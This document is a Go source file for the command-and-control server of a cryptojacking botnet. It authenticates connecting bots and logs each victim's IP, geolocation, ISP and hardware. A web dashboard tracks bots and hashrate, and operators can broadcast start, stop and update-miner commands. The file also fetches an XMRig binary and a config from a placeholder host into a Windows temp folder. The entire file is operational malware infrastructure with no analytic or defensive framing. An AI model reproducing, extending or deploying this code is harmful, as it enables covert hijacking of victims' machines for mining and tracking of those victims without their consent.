package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"html/template"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/time/rate"
)

const (
	USERS_FILE         = "users.json"
	BOT_SERVER_IP      = "0.0.0.0"
	BOT_SERVER_PORT    = "7003"
	botCleanupInterval = 5 * time.Minute
	heartbeatInterval  = 30 * time.Second
	WEB_SERVER_IP      = "0.0.0.0"
	WEB_SERVER_PORT    = "443"
	CERT_FILE          = "server.crt"
	KEY_FILE           = "server.key"
	SESSION_TIMEOUT    = 30 * time.Minute
	writeWait          = 30 * time.Second
	pongWait           = 90 * time.Second
	pingPeriod         = (pongWait * 9) / 10
	maxLoginAttempts   = 5
	loginWindow        = 5 * time.Minute
	XMRigURL           = "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip"
	MinerConfigURL     = "http://yourconfigserver.com/config.json"
	MinerPath          = "C:\\Windows\\Temp\\xmrig.exe"
	ConfigPath         = "C:\\Windows\\Temp\\config.json"
)

var (
	botConnLimiter  = rate.NewLimiter(rate.Every(5*time.Second), 1)
	loginAttempts   = make(map[string]int)
	loginLock       sync.Mutex
	salts           = make(map[string]string)
	saltLock        sync.Mutex
	serverStartTime = time.Now()
	upgrader        = websocket.Upgrader{
		ReadBufferSize:  1024,
		WriteBufferSize: 1024,
	}
)

type Metrics struct {
	BotCount      int           `json:"botCount"`
	ActiveMiners  int           `json:"activeMiners"`
	TotalHashrate float64       `json:"totalHashrate"`
	Bots          []Bot         `json:"bots"`
	MiningStats   []MinerReport `json:"miningStats"`
}

type User struct {
	Username  string    `json:"Username"`
	Password  string    `json:"Password"`
	Expire    time.Time `json:"Expire"`
	Level     string    `json:"Level"`
	CreatedAt time.Time `json:"CreatedAt"`
}

type Bot struct {
	Arch          string     `json:"arch"`
	Conn          net.Conn   `json:"-"`
	IP            string     `json:"ip"`
	Time          time.Time  `json:"time"`
	Country       string     `json:"country"`
	City          string     `json:"city"`
	Region        string     `json:"region"`
	Cores         int        `json:"cores"`
	RAM           float64    `json:"ram"`
	Latitude      float64    `json:"lat"`
	Longitude     float64    `json:"lon"`
	ISP           string     `json:"isp"`
	ASN           string     `json:"asn"`
	LastHeartbeat time.Time  `json:"last_heartbeat"`
	MinerStats    MinerStats `json:"minerStats"`
	IsMining      bool       `json:"isMining"`
}

type DashboardData struct {
	User            User
	BotCount        int
	ActiveMiners    int
	TotalHashrate   float64
	Bots            []Bot
	Users           []User
	FlashMessage    string
	BotsJSON        template.JS
	CSRFToken       string
	ServerStartTime time.Time
	MiningStats     []MinerReport
}

type MinerStats struct {
	Hashrate    float64   `json:"hashrate"`
	Accepted    int64     `json:"accepted"`
	Rejected    int64     `json:"rejected"`
	TotalHashes int64     `json:"totalHashes"`
	Uptime      float64   `json:"uptime"`
	LastUpdate  time.Time `json:"lastUpdate"`
}

type MinerReport struct {
	BotIP      string    `json:"botIP"`
	Hashrate   float64   `json:"hashrate"`
	LastUpdate time.Time `json:"lastUpdate"`
}

var (
	bots         []Bot
	botCount     int
	botCountLock sync.Mutex
	botConns     []*net.Conn
	sessions     = make(map[string]User)
	sessionLock  sync.Mutex
)

func main() {
	if !fileExists(CERT_FILE) || !fileExists(KEY_FILE) {
		generateSelfSignedCert()
	}
	if !fileExists(USERS_FILE) {
		createRootUser()
	}
	go startBotServer()
	go startBotCleanup()
	go cleanupLoginAttempts()
	startWebServer()
}

func fileExists(filename string) bool {
	_, err := os.Stat(filename)
	return err == nil
}

func generateSelfSignedCert() {
	cert := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName: "localhost",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(1, 0, 0),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}
	priv, _ := rsa.GenerateKey(rand.Reader, 2048)
	certBytes, _ := x509.CreateCertificate(rand.Reader, cert, cert, &priv.PublicKey, priv)
	certOut, _ := os.Create(CERT_FILE)
	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: certBytes})
	certOut.Close()
	keyOut, _ := os.OpenFile(KEY_FILE, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
	keyOut.Close()
}

func generateChallenge() string {
	b := make([]byte, 16)
	rand.Read(b)
	challenge := fmt.Sprintf("%x", b)
	saltLock.Lock()
	salts[challenge] = randomString(32)
	saltLock.Unlock()
	return challenge
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer ws.Close()
	ws.SetReadDeadline(time.Now().Add(pongWait))
	ws.SetPongHandler(func(string) error {
		ws.SetReadDeadline(time.Now().Add(pongWait))
		return nil
	})
	ticker := time.NewTicker(pingPeriod)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			ws.SetWriteDeadline(time.Now().Add(writeWait))
			if err := ws.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		default:
			botCountLock.Lock()
			currentBots := getBots()
			var activeMiners int
			var totalHashrate float64
			var miningStats []MinerReport

			for _, b := range currentBots {
				if time.Since(b.LastHeartbeat) <= 2*heartbeatInterval {
					if b.IsMining {
						activeMiners++
						totalHashrate += b.MinerStats.Hashrate
						miningStats = append(miningStats, MinerReport{
							BotIP:      b.IP,
							Hashrate:   b.MinerStats.Hashrate,
							LastUpdate: b.MinerStats.LastUpdate,
						})
					}
				}
			}
			botCountLock.Unlock()

			metrics := Metrics{
				BotCount:      len(currentBots),
				ActiveMiners:  activeMiners,
				TotalHashrate: totalHashrate,
				Bots:          currentBots,
				MiningStats:   miningStats,
			}

			ws.SetWriteDeadline(time.Now().Add(writeWait))
			if err := ws.WriteJSON(metrics); err != nil {
				return
			}
			time.Sleep(1 * time.Second)
		}
	}
}

func sendChallenge(conn net.Conn) (string, error) {
	challenge := generateChallenge()
	saltLock.Lock()
	salt := salts[challenge]
	saltLock.Unlock()
	fullChallenge := fmt.Sprintf("%s:%s", challenge, salt)
	_, err := fmt.Fprintf(conn, "CHALLENGE:%s\n", fullChallenge)
	return challenge, err
}

func verifyResponse(conn net.Conn, challenge string) (bool, error) {
	reader := bufio.NewReader(conn)
	response, err := reader.ReadString('\n')
	if err != nil {
		return false, err
	}
	saltLock.Lock()
	salt, exists := salts[challenge]
	saltLock.Unlock()
	if !exists {
		return false, nil
	}
	return strings.TrimSpace(response) == fmt.Sprintf("%x", sha256.Sum256([]byte(challenge+salt))), nil
}

func createRootUser() {
	rootUser := User{
		Username:  "root",
		Password:  randomString(12),
		Expire:    time.Now().AddDate(1, 0, 0),
		Level:     "Owner",
		CreatedAt: time.Now(),
	}
	bytes, _ := json.MarshalIndent([]User{rootUser}, "", "  ")
	os.WriteFile(USERS_FILE, bytes, 0600)
}

func randomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		b[i] = chars[n.Int64()]
	}
	return string(b)
}

func getGeoLocation(ip string) (country, city, region string, lat, lon float64, err error) {
	if ip == "127.0.0.1" || ip == "::1" || ip == "localhost" {
		return "Local", "Local Network", "Internal", 0, 0, nil
	}
	host, _, _ := net.SplitHostPort(ip)
	ip = host
	resp, err := http.Get(fmt.Sprintf("http://www.geoplugin.net/json.gp?ip=%s", ip))
	if err != nil {
		return "", "", "", 0, 0, err
	}
	defer resp.Body.Close()
	var data struct {
		Country   string  `json:"geoplugin_countryName"`
		City      string  `json:"geoplugin_city"`
		Region    string  `json:"geoplugin_regionName"`
		Latitude  float64 `json:"geoplugin_latitude,string"`
		Longitude float64 `json:"geoplugin_longitude,string"`
		Error     bool    `json:"error"`
	}
	json.NewDecoder(resp.Body).Decode(&data)
	if data.Error {
		return "", "", "", 0, 0, nil
	}
	return data.Country, data.City, data.Region, data.Latitude, data.Longitude, nil
}

func startBotServer() {
	cert, _ := tls.LoadX509KeyPair(CERT_FILE, KEY_FILE)
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}
	listener, _ := tls.Listen("tcp", fmt.Sprintf("%s:%s", BOT_SERVER_IP, BOT_SERVER_PORT), tlsConfig)
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleBotConnection(conn)
	}
}

func handleBotConnection(conn net.Conn) {
	if !botConnLimiter.Allow() {
		conn.Close()
		return
	}
	defer func() {
		conn.Close()
		decrementBotCount()
		removeBot(conn)
	}()

	challenge, err := sendChallenge(conn)
	if err != nil {
		return
	}
	valid, err := verifyResponse(conn, challenge)
	if err != nil || !valid {
		return
	}

	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	newBot := Bot{
		Conn:          conn,
		IP:            ip,
		Time:          time.Now(),
		LastHeartbeat: time.Now(),
	}
	country, city, region, lat, lon, err := getGeoLocation(ip)
	if err == nil {
		newBot.Country = country
		newBot.City = city
		newBot.Region = region
		newBot.Latitude = lat
		newBot.Longitude = lon
	}

	botCountLock.Lock()
	bots = append(bots, newBot)
	botCount = len(bots)
	botConns = append(botConns, &conn)
	botCountLock.Unlock()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		text := scanner.Text()
		conn.SetDeadline(time.Now().Add(heartbeatInterval * 2))

		switch {
		case strings.HasPrefix(text, "PONG:"):
			parts := strings.Split(text, ":")
			if len(parts) >= 4 {
				updateBotInfo(conn, parts[1], parts[2], parts[3])
			}
		case strings.HasPrefix(text, "HEARTBEAT:"):
			parts := strings.Split(text, ":")
			if len(parts) >= 4 {
				updateBotInfo(conn, parts[1], parts[2], parts[3])
			}
			updateBotHeartbeat(conn)
		case strings.HasPrefix(text, "MINER_REPORT:"):
			updateMinerStats(conn, text)
		}
	}
}

func updateMinerStats(conn net.Conn, report string) {
	parts := strings.SplitN(strings.TrimPrefix(report, "MINER_REPORT:"), ":", 5)
	if len(parts) != 5 {
		return
	}
	hashrate, _ := strconv.ParseFloat(parts[0], 64)
	accepted, _ := strconv.ParseInt(parts[1], 10, 64)
	rejected, _ := strconv.ParseInt(parts[2], 10, 64)
	totalHashes, _ := strconv.ParseInt(parts[3], 10, 64)
	uptime, _ := strconv.ParseFloat(parts[4], 64)

	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, bot := range bots {
		if bot.Conn == conn {
			bots[i].MinerStats = MinerStats{
				Hashrate:    hashrate,
				Accepted:    accepted,
				Rejected:    rejected,
				TotalHashes: totalHashes,
				Uptime:      uptime,
				LastUpdate:  time.Now(),
			}
			bots[i].IsMining = true
			break
		}
	}
}

func updateBotInfo(conn net.Conn, arch, coresStr, ramStr string) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, b := range bots {
		if b.Conn == conn {
			bots[i].Arch = arch
			if cores, err := strconv.Atoi(coresStr); err == nil {
				bots[i].Cores = cores
			}
			if ram, err := strconv.ParseFloat(ramStr, 64); err == nil {
				bots[i].RAM = ram
			}
			break
		}
	}
}

func updateBotHeartbeat(conn net.Conn) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, b := range bots {
		if b.Conn == conn {
			bots[i].LastHeartbeat = time.Now()
			break
		}
	}
}

func removeBot(conn net.Conn) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, b := range bots {
		if b.Conn == conn {
			bots = append(bots[:i], bots[i+1:]...)
			break
		}
	}

	for i, botConn := range botConns {
		if *botConn == conn {
			botConns = append(botConns[:i], botConns[i+1:]...)
			break
		}
	}
	botCount = len(bots)
}

func startBotCleanup() {
	ticker := time.NewTicker(botCleanupInterval)
	defer ticker.Stop()

	for range ticker.C {
		cleanupStaleBots()
	}
}

func cleanupStaleBots() {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	threshold := 2 * heartbeatInterval
	var activeBots []Bot

	for _, b := range bots {
		if time.Since(b.LastHeartbeat) <= threshold {
			activeBots = append(activeBots, b)
		} else if b.Conn != nil {
			b.Conn.Close()
		}
	}

	bots = activeBots
	botCount = len(bots)
}

func cleanupLoginAttempts() {
	ticker := time.NewTicker(loginWindow)
	defer ticker.Stop()

	for range ticker.C {
		loginLock.Lock()
		loginAttempts = make(map[string]int)
		loginLock.Unlock()
	}
}

func checkLoginAttempts(ip string) bool {
	loginLock.Lock()
	defer loginLock.Unlock()
	attempts, exists := loginAttempts[ip]
	if !exists {
		loginAttempts[ip] = 1
		return true
	}
	if attempts >= maxLoginAttempts {
		return false
	}
	loginAttempts[ip]++
	return true
}

func uptimeHours(startTime time.Time) float64 {
	return time.Since(startTime).Hours()
}

func startWebServer() {
	funcMap := template.FuncMap{
		"div": func(a, b uint64) float64 {
			if b == 0 {
				return 0
			}
			return float64(a) / float64(b)
		},
		"uptimeHours": uptimeHours,
		"formatTime":  func(t time.Time) string { return t.Format(time.RFC3339) },
		"now":         func() time.Time { return time.Now() },
		"sub":         func(a, b uint64) uint64 { return a - b },
		"formatGB":    func(bytes uint64) float64 { return float64(bytes) / 1073741824.0 },
		"isActive": func(lastHeartbeat time.Time) bool {
			return time.Since(lastHeartbeat) <= 2*heartbeatInterval
		},
	}

	tmpl, err := template.New("").Funcs(funcMap).ParseGlob("views-folder/*.html")
	if err != nil {
		log.Fatalf("Error loading templates: %v", err)
	}

	server := &http.Server{
		Addr: fmt.Sprintf("%s:%s", WEB_SERVER_IP, WEB_SERVER_PORT),
		TLSConfig: &tls.Config{
			MinVersion:               tls.VersionTLS13,
			PreferServerCipherSuites: true,
			CurvePreferences: []tls.CurveID{
				tls.X25519,
				tls.CurveP256,
			},
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
			},
			SessionTicketsDisabled: true,
		},
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}
		sessionID := getSessionCookie(r)
		if _, exists := getSession(sessionID); exists {
			http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
			return
		}
		tmpl.ExecuteTemplate(w, "login.html", nil)
	})

	http.HandleFunc("/ws", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			handleWebSocket(w, r)
		}))

	http.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}

		ip := r.RemoteAddr
		if host, _, err := net.SplitHostPort(ip); err == nil {
			ip = host
		}

		if !checkLoginAttempts(ip) {
			http.Redirect(w, r, "/?flash=Too many login attempts", http.StatusSeeOther)
			return
		}

		username := r.FormValue("username")
		password := r.FormValue("password")

		if exists, user := authUser(username, password); exists {
			newSessionID := randomString(64)
			oldSessionID := getSessionCookie(r)
			if oldSessionID != "" {
				clearSession(oldSessionID)
			}
			setSession(newSessionID, *user)
			http.SetCookie(w, &http.Cookie{
				Name:     "session",
				Value:    newSessionID,
				Path:     "/",
				Secure:   true,
				HttpOnly: true,
				MaxAge:   3600,
				SameSite: http.SameSiteStrictMode,
			})
			http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
			return
		}
		http.Redirect(w, r, "/?flash=Invalid credentials", http.StatusSeeOther)
	})

	http.HandleFunc("/dashboard", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			activeMiners := 0
			totalHashrate := 0.0
			var miningStats []MinerReport
			currentBots := getBots()

			for _, b := range currentBots {
				if b.IsMining {
					activeMiners++
					totalHashrate += b.MinerStats.Hashrate
					miningStats = append(miningStats, MinerReport{
						BotIP:      b.IP,
						Hashrate:   b.MinerStats.Hashrate,
						LastUpdate: b.MinerStats.LastUpdate,
					})
				}
			}

			data := DashboardData{
				User:            user,
				BotCount:        len(currentBots),
				ActiveMiners:    activeMiners,
				TotalHashrate:   totalHashrate,
				Bots:            currentBots,
				Users:           getUsers(),
				FlashMessage:    r.URL.Query().Get("flash"),
				CSRFToken:       randomString(32),
				ServerStartTime: serverStartTime,
				MiningStats:     miningStats,
			}

			botsJSON, _ := json.Marshal(data.Bots)
			data.BotsJSON = template.JS(botsJSON)

			tmpl.ExecuteTemplate(w, "dashboard.html", data)
		}))

	http.HandleFunc("/start-mining", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			if r.Method != "POST" {
				http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
				return
			}
			if err := sendToBots("START_MINING"); err != nil {
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}
			w.Write([]byte("Mining started on all bots"))
		}))

	http.HandleFunc("/stop-mining", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			if r.Method != "POST" {
				http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
				return
			}
			if err := sendToBots("STOP_MINING"); err != nil {
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}
			w.Write([]byte("Mining stopped on all bots"))
		}))

	http.HandleFunc("/update-miner", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			if r.Method != "POST" {
				http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
				return
			}
			if err := downloadMiner(); err != nil {
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}
			if err := sendToBots("UPDATE_MINER"); err != nil {
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}
			w.Write([]byte("Miner updated and command sent"))
		}))

	http.HandleFunc("/logout", func(w http.ResponseWriter, r *http.Request) {
		sessionID := getSessionCookie(r)
		if sessionID != "" {
			clearSession(sessionID)
		}
		http.SetCookie(w, &http.Cookie{
			Name:     "session",
			Value:    "",
			Path:     "/",
			MaxAge:   -1,
			Secure:   true,
			HttpOnly: true,
			SameSite: http.SameSiteStrictMode,
		})
		http.Redirect(w, r, "/", http.StatusSeeOther)
	})

	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
	log.Fatal(server.ListenAndServeTLS(CERT_FILE, KEY_FILE))
}

func requireAuth(handler func(http.ResponseWriter, *http.Request, User)) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		sessionID := getSessionCookie(r)
		if sessionID == "" {
			http.Redirect(w, r, "/?flash=Please login first", http.StatusSeeOther)
			return
		}
		user, exists := getSession(sessionID)
		if !exists {
			http.Redirect(w, r, "/?flash=Please login first", http.StatusSeeOther)
			return
		}
		handler(w, r, user)
	}
}

func getSessionCookie(r *http.Request) string {
	cookie, err := r.Cookie("session")
	if err != nil {
		return ""
	}
	return cookie.Value
}

func setSession(id string, user User) {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	sessions[id] = user
}

func getSession(sessionID string) (User, bool) {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	user, exists := sessions[sessionID]
	if !exists {
		return User{}, false
	}
	if time.Since(user.Expire) > SESSION_TIMEOUT {
		delete(sessions, sessionID)
		return User{}, false
	}
	return user, true
}

func clearSession(id string) {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	delete(sessions, id)
}

func authUser(username, password string) (bool, *User) {
	users := getUsers()
	for _, user := range users {
		if user.Username == username && user.Password == password {
			if time.Now().After(user.Expire) {
				return false, nil
			}
			return true, &user
		}
	}
	return false, nil
}

func getUsers() []User {
	data, err := os.ReadFile(USERS_FILE)
	if err != nil {
		return []User{}
	}
	var users []User
	if err := json.Unmarshal(data, &users); err != nil {
		return []User{}
	}
	return users
}

func deleteUser(username string) error {
	users := getUsers()
	if len(users) == 0 {
		return fmt.Errorf("no users found")
	}

	var updatedUsers []User
	found := false
	for _, user := range users {
		if user.Username != username {
			updatedUsers = append(updatedUsers, user)
		} else {
			found = true
		}
	}

	if !found {
		return fmt.Errorf("user '%s' not found", username)
	}

	if err := saveUsers(updatedUsers); err != nil {
		return fmt.Errorf("failed to save updated users: %w", err)
	}

	return nil
}

func saveUsers(users []User) error {
	data, err := json.MarshalIndent(users, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal users: %w", err)
	}

	file, err := os.OpenFile(USERS_FILE, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		return fmt.Errorf("failed to open users file: %w", err)
	}
	defer file.Close()

	if _, err := file.Write(data); err != nil {
		return fmt.Errorf("failed to write users file: %w", err)
	}

	return nil
}

func getBots() []Bot {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	var activeBots []Bot
	for _, b := range bots {
		if b.Conn != nil {
			activeBots = append(activeBots, b)
		}
	}
	return activeBots
}

func getBotCount() int {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	count := 0
	for _, bot := range bots {
		if bot.Conn != nil && time.Since(bot.LastHeartbeat) <= 2*heartbeatInterval {
			count++
		}
	}
	return count
}

func decrementBotCount() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	if botCount > 0 {
		botCount--
	}
}

func sendToBots(command string) error {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	var lastErr error
	for _, bot := range bots {
		if bot.Conn != nil {
			bot.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			_, err := bot.Conn.Write([]byte(command + "\n"))
			if err != nil {
				lastErr = err
			}
		}
	}
	return lastErr
}

func downloadMiner() error {
	if err := downloadFile(XMRigURL, MinerPath); err != nil {
		return fmt.Errorf("failed to download miner: %w", err)
	}
	if err := downloadFile(MinerConfigURL, ConfigPath); err != nil {
		return fmt.Errorf("failed to download config: %w", err)
	}
	return nil
}

func downloadFile(url, path string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		return err
	}
	out, err := os.Create(path)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, resp.Body)
	return err
}
